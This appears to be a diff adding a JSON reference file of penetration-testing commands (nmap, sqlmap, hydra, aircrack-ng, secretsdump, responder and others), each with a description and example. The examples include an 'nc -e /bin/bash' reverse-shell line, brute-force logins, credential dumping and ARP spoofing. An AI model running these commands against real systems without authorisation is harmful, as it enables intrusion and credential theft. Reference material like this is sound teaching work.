@@ -1,0 +1,147 @@
+{
+  "commands": [
+    {"cmd":"nmap","desc":"Scan a target for open ports","category":"recon","explanation":"Nmap is a network scanning tool used to discover hosts and services on a network.","usage":"nmap [options] target","examples":["nmap 192.168.1.1","nmap -sS -A 192.168.1.1"]},
+
+    {"cmd":"whois","desc":"Lookup domain registration info","category":"recon","explanation":"Retrieves domain ownership and registration details.","usage":"whois domain","examples":["whois example.com"]},
+
+    {"cmd":"theHarvester","desc":"Collect emails and subdomains","category":"recon","explanation":"Gathers OSINT data like emails and subdomains from public sources.","usage":"theHarvester -d domain -b source","examples":["theHarvester -d example.com -b google"]},
+
+    {"cmd":"dnsenum","desc":"Enumerate DNS information","category":"recon","explanation":"Performs DNS enumeration to find subdomains and records.","usage":"dnsenum domain","examples":["dnsenum example.com"]},
+
+    {"cmd":"nikto","desc":"Scan web server for vulnerabilities","category":"scanning","explanation":"Performs comprehensive web server vulnerability scans.","usage":"nikto -h target","examples":["nikto -h http://example.com"]},
+
+    {"cmd":"gobuster","desc":"Brute-force directories and files","category":"scanning","explanation":"Discovers hidden directories and files on web servers.","usage":"gobuster dir -u URL -w wordlist","examples":["gobuster dir -u http://example.com -w wordlist.txt"]},
+
+    {"cmd":"dirb","desc":"Discover web content","category":"scanning","explanation":"Scans web servers for hidden directories.","usage":"dirb URL","examples":["dirb http://example.com"]},
+
+    {"cmd":"enum4linux","desc":"Enumerate SMB shares","category":"scanning","explanation":"Gathers information from Windows/Samba systems.","usage":"enum4linux target","examples":["enum4linux 192.168.1.1"]},
+
+    {"cmd":"snmpwalk","desc":"Query SNMP data","category":"scanning","explanation":"Retrieves management data from SNMP-enabled devices.","usage":"snmpwalk -v version -c community target","examples":["snmpwalk -v2c -c public 192.168.1.1"]},
+
+    {"cmd":"msfconsole","desc":"Launch Metasploit framework","category":"exploitation","explanation":"Starts the Metasploit penetration testing framework.","usage":"msfconsole","examples":["msfconsole"]},
+
+    {"cmd":"searchsploit","desc":"Search exploit database","category":"exploitation","explanation":"Searches for known exploits in the Exploit-DB.","usage":"searchsploit keyword","examples":["searchsploit apache"]},
+
+    {"cmd":"sqlmap","desc":"Automate SQL injection attacks","category":"exploitation","explanation":"Detects and exploits SQL injection vulnerabilities.","usage":"sqlmap -u URL [options]","examples":["sqlmap -u \"http://site.com?id=1\" --dbs"]},
+
+    {"cmd":"hydra","desc":"Brute-force login credentials","category":"password","explanation":"Performs password attacks against various protocols.","usage":"hydra -l user -P wordlist protocol://target","examples":["hydra -l admin -P rockyou.txt ssh://192.168.1.1"]},
+
+    {"cmd":"john","desc":"Crack password hashes","category":"password","explanation":"Cracks password hashes using wordlists or brute force.","usage":"john hashfile","examples":["john hashes.txt"]},
+
+    {"cmd":"hashcat","desc":"Advanced password cracking","category":"password","explanation":"High-performance password cracking tool using GPU/CPU.","usage":"hashcat -m mode -a attack hashfile wordlist","examples":["hashcat -m 0 -a 0 hash.txt rockyou.txt"]},
+
+    {"cmd":"airmon-ng","desc":"Enable monitor mode on wireless interface","category":"wireless","explanation":"Prepares wireless interfaces for packet capture.","usage":"airmon-ng start interface","examples":["airmon-ng start wlan0"]},
+
+    {"cmd":"airodump-ng","desc":"Capture wireless packets","category":"wireless","explanation":"Captures packets from wireless networks.","usage":"airodump-ng interface","examples":["airodump-ng wlan0mon"]},
+
+    {"cmd":"aireplay-ng","desc":"Inject wireless packets","category":"wireless","explanation":"Performs packet injection attacks.","usage":"aireplay-ng [options] interface","examples":["aireplay-ng -0 10 -a targetAP wlan0mon"]},
+
+    {"cmd":"aircrack-ng","desc":"Crack WiFi passwords","category":"wireless","explanation":"Cracks WEP/WPA keys from captured packets.","usage":"aircrack-ng capture.cap","examples":["aircrack-ng -w rockyou.txt capture.cap"]},
+
+    {"cmd":"burpsuite","desc":"Web application testing proxy","category":"web","explanation":"Intercepts and modifies HTTP requests for testing.","usage":"burpsuite","examples":["burpsuite"]},
+
+    {"cmd":"wfuzz","desc":"Fuzz web applications","category":"web","explanation":"Brute-forces parameters and directories in web apps.","usage":"wfuzz -w wordlist URL","examples":["wfuzz -w wordlist.txt http://example.com/FUZZ"]},
+
+    {"cmd":"whatweb","desc":"Identify web technologies","category":"web","explanation":"Detects technologies used by websites.","usage":"whatweb URL","examples":["whatweb example.com"]},
+
+    {"cmd":"netcat","desc":"Read/write network connections","category":"post","explanation":"Versatile tool for networking, often used for shells.","usage":"nc [options] host port","examples":["nc -lvnp 4444","nc 192.168.1.1 80"]},
+
+    {"cmd":"socat","desc":"Relay network connections","category":"post","explanation":"Creates bidirectional data transfers between endpoints.","usage":"socat [options]","examples":["socat TCP-LISTEN:4444 STDOUT"]},
+
+    {"cmd":"nc","desc":"Create reverse shells","category":"post","explanation":"Common shorthand for netcat used in shell connections.","usage":"nc host port","examples":["nc -e /bin/bash 192.168.1.1 4444"]},
+
+    {"cmd":"linpeas","desc":"Privilege escalation scanner","category":"post","explanation":"Automates local privilege escalation checks on Linux.","usage":"./linpeas.sh","examples":["./linpeas.sh"]},
+
+    {"cmd":"ps","desc":"Show running processes","category":"system","explanation":"Displays active processes on a system.","usage":"ps [options]","examples":["ps aux"]},
+
+    {"cmd":"kill","desc":"Terminate process by PID","category":"system","explanation":"Stops a running process using its PID.","usage":"kill PID","examples":["kill 1234"]},
+
+    {"cmd":"ifconfig","desc":"Show network interfaces","category":"network","explanation":"Displays or configures network interfaces.","usage":"ifconfig","examples":["ifconfig"]},
+
+    {"cmd":"ip","desc":"Manage network settings","category":"network","explanation":"Modern tool for network configuration.","usage":"ip [options]","examples":["ip a","ip route"]},
+
+    {"cmd":"route","desc":"Show routing table","category":"network","explanation":"Displays or modifies routing table.","usage":"route","examples":["route -n"]},
+
+    {"cmd":"tcpdump","desc":"Capture network traffic","category":"network","explanation":"Analyzes network packets in real time.","usage":"tcpdump [options]","examples":["tcpdump -i eth0"]},
+
+    {"cmd":"wireshark","desc":"Graphical packet analyzer","category":"network","explanation":"Captures and analyzes network traffic visually.","usage":"wireshark","examples":["wireshark"]},
+
+    {"cmd":"amass","desc":"Enumerate subdomains using OSINT","category":"recon","explanation":"Performs in-depth DNS enumeration and subdomain discovery using multiple sources.","usage":"amass enum -d domain","examples":["amass enum -d example.com"]},
+
+    {"cmd":"sublist3r","desc":"Find subdomains quickly","category":"recon","explanation":"Enumerates subdomains using search engines and OSINT.","usage":"sublist3r -d domain","examples":["sublist3r -d example.com"]},
+
+    {"cmd":"assetfinder","desc":"Find related domains","category":"recon","explanation":"Discovers domains and subdomains associated with a target.","usage":"assetfinder domain","examples":["assetfinder example.com"]},
+
+    {"cmd":"httprobe","desc":"Check live HTTP hosts","category":"recon","explanation":"Filters active domains that respond over HTTP/HTTPS.","usage":"cat domains.txt | httprobe","examples":["cat subs.txt | httprobe"]},
+
+    {"cmd":"naabu","desc":"Fast port scanner","category":"scanning","explanation":"Performs fast SYN scans to discover open ports.","usage":"naabu -host target","examples":["naabu -host 192.168.1.1"]},
+
+    {"cmd":"masscan","desc":"High-speed port scanner","category":"scanning","explanation":"Scans large networks extremely quickly for open ports.","usage":"masscan target -p ports","examples":["masscan 192.168.1.0/24 -p1-65535"]},
+
+    {"cmd":"rustscan","desc":"Fast port discovery tool","category":"scanning","explanation":"Combines fast scanning with detailed service enumeration.","usage":"rustscan -a target","examples":["rustscan -a 192.168.1.1"]},
+
+    {"cmd":"feroxbuster","desc":"Content discovery tool","category":"scanning","explanation":"Recursively brute-forces directories and files on web servers.","usage":"feroxbuster -u URL","examples":["feroxbuster -u http://example.com"]},
+
+    {"cmd":"ffuf","desc":"Fast web fuzzer","category":"web","explanation":"Fuzzes URLs, parameters, and directories using wordlists.","usage":"ffuf -u URL -w wordlist","examples":["ffuf -u http://example.com/FUZZ -w wordlist.txt"]},
+
+    {"cmd":"wpscan","desc":"Scan WordPress sites","category":"web","explanation":"Identifies vulnerabilities in WordPress installations.","usage":"wpscan --url URL","examples":["wpscan --url http://example.com"]},
+
+    {"cmd":"joomscan","desc":"Scan Joomla sites","category":"web","explanation":"Detects vulnerabilities in Joomla CMS.","usage":"joomscan -u URL","examples":["joomscan -u http://example.com"]},
+
+    {"cmd":"xsser","desc":"Detect XSS vulnerabilities","category":"web","explanation":"Automates detection and exploitation of XSS flaws.","usage":"xsser -u URL","examples":["xsser -u http://example.com"]},
+
+    {"cmd":"crunch","desc":"Generate custom wordlists","category":"password","explanation":"Creates wordlists based on patterns and character sets.","usage":"crunch min max charset","examples":["crunch 6 8 abc123"]},
+
+    {"cmd":"cewl","desc":"Generate wordlist from website","category":"password","explanation":"Scrapes words from websites to build targeted wordlists.","usage":"cewl URL","examples":["cewl http://example.com"]},
+
+    {"cmd":"medusa","desc":"Parallel login brute-force","category":"password","explanation":"Fast password brute-forcing tool similar to Hydra.","usage":"medusa -u user -P wordlist -h host","examples":["medusa -u admin -P pass.txt -h 192.168.1.1"]},
+
+    {"cmd":"crackmapexec","desc":"Post-exploitation tool for networks","category":"post","explanation":"Automates lateral movement and credential validation.","usage":"crackmapexec protocol target","examples":["crackmapexec smb 192.168.1.0/24"]},
+
+    {"cmd":"bloodhound","desc":"Analyze Active Directory relationships","category":"post","explanation":"Maps AD relationships to identify privilege escalation paths.","usage":"bloodhound","examples":["bloodhound"]},
+
+    {"cmd":"impacket-secretsdump","desc":"Dump password hashes from systems","category":"post","explanation":"Extracts credentials from Windows systems.","usage":"secretsdump.py target","examples":["secretsdump.py user@192.168.1.1"]},
+
+    {"cmd":"evil-winrm","desc":"Remote Windows shell","category":"post","explanation":"Provides WinRM shell access to Windows systems.","usage":"evil-winrm -i target -u user -p pass","examples":["evil-winrm -i 192.168.1.1 -u admin -p password"]},
+
+    {"cmd":"responder","desc":"Capture network credentials","category":"post","explanation":"Poisons network protocols to capture hashes.","usage":"responder -I interface","examples":["responder -I eth0"]},
+
+    {"cmd":"bettercap","desc":"Network attack framework","category":"network","explanation":"Performs MITM attacks, sniffing, and spoofing.","usage":"bettercap -iface interface","examples":["bettercap -iface eth0"]},
+
+    {"cmd":"ettercap","desc":"Man-in-the-middle attacks","category":"network","explanation":"Performs ARP poisoning and traffic interception.","usage":"ettercap -T -q -i interface","examples":["ettercap -T -i eth0"]},
+
+    {"cmd":"arpspoof","desc":"ARP spoofing attack","category":"network","explanation":"Redirects network traffic via ARP poisoning.","usage":"arpspoof -i interface target","examples":["arpspoof -i eth0 192.168.1.1"]},
+
+    {"cmd":"macchanger","desc":"Change MAC address","category":"network","explanation":"Spoofs MAC address for anonymity.","usage":"macchanger -r interface","examples":["macchanger -r wlan0"]},
+
+    {"cmd":"proxychains","desc":"Route traffic through proxies","category":"network","explanation":"Forces applications to use proxy chains.","usage":"proxychains command","examples":["proxychains nmap 192.168.1.1"]},
+
+    {"cmd":"xclip","desc":"Copy output to clipboard","category":"utility","explanation":"Copies command output to clipboard for reuse.","usage":"command | xclip","examples":["cat file.txt | xclip"]},
+
+    {"cmd":"rlwrap","desc":"Add readline support","category":"utility","explanation":"Enhances shells with history and editing.","usage":"rlwrap command","examples":["rlwrap nc -lvnp 4444"]},
+
+    {"cmd":"script","desc":"Record terminal session","category":"utility","explanation":"Logs terminal activity to a file.","usage":"script filename","examples":["script session.log"]},
+
+    {"cmd":"strings","desc":"Extract printable strings","category":"files","explanation":"Finds readable text in binaries.","usage":"strings file","examples":["strings binary"]},
+
+    {"cmd":"binwalk","desc":"Analyze binary files","category":"files","explanation":"Detects embedded files and data in binaries.","usage":"binwalk file","examples":["binwalk firmware.bin"]},
+
+    {"cmd":"exiftool","desc":"Extract metadata","category":"files","explanation":"Reads metadata from files like images and documents.","usage":"exiftool file","examples":["exiftool image.jpg"]},
+
+    {"cmd":"steghide","desc":"Hide/extract data in images","category":"files","explanation":"Performs steganography on files.","usage":"steghide extract -sf file","examples":["steghide extract -sf image.jpg"]},
+
+    {"cmd":"johnny","desc":"GUI for John the Ripper","category":"password","explanation":"Provides graphical interface for password cracking.","usage":"johnny","examples":["johnny"]},
+
+    {"cmd":"patator","desc":"Multi-purpose brute-force tool","category":"password","explanation":"Flexible brute-forcing tool for multiple protocols.","usage":"patator module options","examples":["patator ssh_login host=192.168.1.1"]},
+
+    {"cmd":"sqlninja","desc":"Exploit SQL Server injection","category":"exploitation","explanation":"Targets SQL Server for exploitation.","usage":"sqlninja -m mode","examples":["sqlninja -m test"]},
+
+    {"cmd":"beef-xss","desc":"Browser exploitation framework","category":"exploitation","explanation":"Hooks browsers for client-side attacks.","usage":"beef-xss","examples":["beef-xss"]},
+
+    {"cmd":"setoolkit","desc":"Social engineering toolkit","category":"exploitation","explanation":"Framework for phishing and social engineering attacks.","usage":"setoolkit","examples":["setoolkit"]},
+
+    {"cmd":"apktool","desc":"Reverse engineer APK files","category":"mobile","explanation":"Decompiles Android applications.","usage":"apktool d file.apk","examples":["apktool d app.apk"]},
+
+    {"cmd":"jadx","desc":"Decompile Android apps","category":"mobile","explanation":"Converts APK to readable Java code.","usage":"jadx file.apk","examples":["jadx app.apk"]}
+  ]
+}
